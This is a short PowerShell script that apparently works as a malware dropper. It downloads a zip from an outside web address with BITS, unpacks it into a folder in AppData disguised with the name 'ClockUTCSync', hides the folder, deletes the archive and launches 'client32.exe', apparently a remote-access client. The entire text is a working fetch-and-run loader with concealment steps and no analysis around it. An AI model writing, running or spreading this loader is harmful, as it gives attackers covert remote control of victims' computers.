cd ""
$link = "https://gouzidla.com/borad/ged.php"
$rnum = get-random -minimum 5 -maximum 9
$rrnum = get-random -minimum 1024 -maximum 9999
$chrs = "abcdefghijklmnopstuvwxyzABCDEFGHIJKLMNOPRSTUVWXYZ1234567890"
$rstr = ""
$ran = new-object "System.Random"
for ($i = 0; $i -lt $rnum; $i++) {
  $rstr = $chrs[$ran.next(0, $chrs.length)]
}
$rzip = $rstr + ".zip"
$path = $env:appdata + "\\" + $rzip
$pzip = $env:appdata + "\\ClockUTCSync_" + $rrnum
start-bitstransfer -source $link -destination $path
expand-archive -path $path -destinationpath $pzip
$fold = get-item $pzip -force
$fold.attributes = "Hidden"
remove-item -path $path
cd $pzip
start "client32.exe"
